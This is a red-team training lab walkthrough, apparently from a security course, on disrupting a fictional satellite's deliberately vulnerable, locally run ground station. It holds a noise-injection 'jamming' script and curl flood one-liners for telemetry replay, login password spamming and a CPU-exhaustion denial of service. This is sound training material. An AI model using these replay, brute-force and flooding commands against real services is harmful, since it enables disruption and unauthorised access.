![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Lab 2 - The Denial

**Scenario:** As **red team**, your task is to **disrupt ODYSSEY-1’s ground communications**

You will:  
1. **Degrade** the downlink (simulate jamming)
2. **Confuse** operators with replay attacks
3. **Lock operators out** by overwhelming their weak ground station service

>[!IMPORTANT]
>Make sure you have done [Lab 1](../TheIntercepter/TheIntercepterLab.md) already

---

**Provided:**
- **pass_clean.iq** (48 kS/s, complex float32) - synthetic BFSK downlink
- **groundstation/** (Dockerized, intentionally weak):

1. ``/`` dashboard (SSE live view)

2. ``/stream`` SSE feed (no auth)

3. ``/ingest`` telemetry ingest (no auth, no freshness checks)

4. ``/login`` weak login (no lockout / rate limits)

5. ``/cmd`` command endpoint (no auth, no rate limits, heavy compute per call)

---

## Start
### Part A - Break the Link (Simulated Jamming)

- You will need the **GRC Flowgraph** we built during [Lab 1](../TheIntercepter/TheInterceptLab.md)

![image](/Assets/RLab2/RLab2-1.png)

- Let's use that for our ``pass_clean.iq``, we need to update our 2 ``Sink File`` blocks and our ``File Source`` block

![image](/Assets/RLab2/RLab2-2.png)

<br>

![image](/Assets/RLab2/RLab2-3.png)

<br>

![image](/Assets/RLab2/RLab2-4.png)

- Run the flow after changing the **File Source** and the 2 **File Sinks** to the right paths. You can run it for **5-10 seconds**, that is plenty!

```bash
cd ~/Desktop/TheDenial
```

- Using **xxd** grants us this output, make sure it works for you as well
```bash
xxd pass_clean_BPF.txt
```


![image](/Assets/RLab2/RLab2-5.png)

- Now try to write your own jamming script with [Gaussian Noise](https://en.wikipedia.org/wiki/Gaussian_noise) or use this one if you don't know how

```bash
nano jam.py
```

- Copy paste this:

```
import numpy as np, sys, math
in_iq, out_iq, snr_db = sys.argv[1], sys.argv[2], float(sys.argv[3])
x = np.fromfile(in_iq, dtype=np.complex64)
snr_lin = 10**(snr_db/10)
noise_var = 1/(2*snr_lin)
n = (np.random.normal(0, math.sqrt(noise_var), x.shape)
     + 1j*np.random.normal(0, math.sqrt(noise_var), x.shape)).astype(np.complex64)
(x+n).tofile(out_iq)
```

- Do `Ctrl + x` and `y` and `Enter` to save and exit

- And make the new files like this
```bash
python3 jam.py pass_clean.iq pass_jam_0dB.iq 0
```

```bash
python3 jam.py pass_clean.iq pass_jam_-5dB.iq -5
```


- Now run the flowgraph on both of these files, what do you notice?
1. The tag debug doesn't work, it messes up the access code and so it will not get any hits
2. Because of Nr. 1, the BPF file will be empty
3. The ``.bits`` files are completely different from each other, I'll show only the beginnings

![image](/Assets/RLab2/RLab2-6.png)

<br>

![image](/Assets/RLab2/RLab2-7.png)

<br>

![image](/Assets/RLab2/RLab2-8.png)

- It makes it impossible to decode, and if you don't believe, try it yourself with this script

```bash
nano decodeScript.py
```

- Paste this code in the file and replace `<whole 0/1 string here>` with your encoded **bit stream**

>[!IMPORTANT]
>Make sure to replace in code with your bit stream, else it will not work

```
b = "<whole 0/1 string here>"

def try_offsets(bits):
    import string
    best = []
    for off in range(8):
        chunk = bits[off:]
        by = int(len(chunk)//8)*8
        data = int(chunk[:by], 2).to_bytes(by//8, 'big')
        txt = ''.join(chr(c) if 32<=c<127 or c in (9,10,13) else '·' for c in data)
        score = sum(1 for c in data if 32<=c<127)
        best.append((score/len(data), off, txt[:400]))  # preview
    return sorted(best, reverse=True)

candidates = try_offsets(b)
for score, off, preview in candidates:
    print(f"offset={off}, printable={score:.2%}\n{preview}\n")
```

- To save and exit do `Ctrl + x` and `y` and `Enter`

- Run it with
```bash
python3 decodeScript.py
```

### Part B - Replay Attack (Confuse Operators)
- Start the **ground station**
```bash
cd groundstation
```
```bash
sudo docker compose up --build
```

- Now visit ``http://localhost:5000``

![image](/Assets/RLab2/RLab2-9.png)

- Dashboard shows live telemetry (``/stream`` SSE feed)

- Go to `http://localhost:5000/stream`

![image](/Assets/RLab2/RLab2-10.png)

- Save one decoded telemetry JSON as ``stale.json``:

```bash
echo '<JSON HERE>' > stale.json
```

- Run the attack
```bash
seq 1 500 | xargs -I{} -P 20 sh -c \
 'curl -s -X POST http://localhost:5000/ingest \
   -H "Content-Type: application/json" \
   --data-binary @stale.json'
```

- Watch the dashboard, values freeze/loop, operators see **stale data**


### Part C - Lock Operators Out (Denial of Service)
- Spam ``/login`` (weak, no rate limit)
```bash
seq 1 1000 | xargs -I{} -P 50 sh -c \
  'curl -s -X POST http://localhost:5000/login \
    -d user=admin -d pass=pwd{}'
```

- Observe endless **“success”**

- Flood ``/cmd`` (heavy CPU per call)
```bash
echo '{"mode":"CAL"}' > cmd.json
```
```bash
seq 1 20000 | xargs -I{} -P 400 sh -c \
 'curl -s -H "Content-Type: application/json" --data-binary @cmd.json http://localhost:5000/cmd >/dev/null'
```

- Now while that is running try to run a normal command on another terminal
```bash
curl -s -H "Content-Type: application/json"   --data '{"mode":"SAFE"}' http://localhost:5000/cmd
```

- There is no latency whatsoever because the server is keeping up, let's make it weaker

```bash
cd ~/Desktop/TheDenial/groundstation
```

```bash
sudo docker compose ps
```

That name goes into the next command

```bash
sudo docker update --cpus 0.2 <the name here>
```

- Now try the attack again and try a normal command, it should take a while before it goes through



***                                                                 
<b><i>Continuing the course? </br>[Next Lab](/Labs/redLabs/TheTakeover/TheTakeoverLab.md)</i></b>

<b><i>Want to go back? </br>[Previous Lab](/Labs/redLabs/TheIntercepter/TheIntercepterLab.md)</i></b>

<b><i>Looking for a different lab? </br>[Lab Directory](/navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/labdestruction.md)

---

> Created By Turcu Știolică Alexandru - Black Hills Information Security
